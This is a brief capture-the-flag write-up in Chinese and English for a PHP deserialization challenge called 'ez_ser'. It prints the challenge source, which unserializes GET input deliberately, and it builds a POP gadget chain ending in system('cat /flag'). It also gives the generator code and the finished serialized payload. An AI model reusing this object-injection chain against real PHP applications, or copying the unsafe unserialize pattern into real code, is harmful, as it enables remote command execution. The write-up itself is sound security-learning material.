### ez_ser

---

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];
unserialize($ser);
?>
```

构造pop链

`Misc_getflag()<--Pwn__get<--Web_wakeuo<--Re_construct（）`

```php
$b = new web();
$b->kw = new re();
$b->kw->chu0 = new pwn();
$b->kw->chu0->over = new Misc();
echo urldecode(serialize($b));

#O:3:"web":2:{s:2:"kw";O:2:"re":1:{s:4:"chu0";O:3:"pwn":2:{s:4:"dusk";N;s:4:"over";O:4:"Misc":2:{s:7:"nothing";N;s:4:"flag";N;}}}s:2:"dt";N;}
```

